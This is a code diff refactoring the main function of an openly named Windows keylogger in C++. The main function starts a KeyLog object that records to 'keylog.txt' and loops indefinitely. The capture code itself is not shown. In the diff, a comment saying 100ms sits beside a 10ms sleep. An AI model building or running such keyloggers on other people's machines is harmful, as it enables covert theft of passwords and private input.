@@ -1,21 +1,16 @@
 #include <iostream>
 #include <windows.h>
 
-#include "KeyLog.h"
+#include "../include/Keylog.h"
 
-int main() {
-  try {
+[[noreturn]] int main() {
     std::cout << "Keylogger Starting" << std::endl;
 
-    KeyLog keylogger("keylog.txt");
-    keylogger.start();
-    // keeping the thread active
-    while (true) {
-      // Sleep for 1s
-      Sleep(1000);
-    }
-  } catch (const std::exception &e) {
-    std::cerr << "Error" << e.what() << std::endl;
-    return 1;
+  KeyLog keylogger( "keylog.txt");
+  keylogger.start();
+  // keeping the thread active
+  while (true) {
+    // Sleep for 100ms
+    Sleep(10);
   }
 }
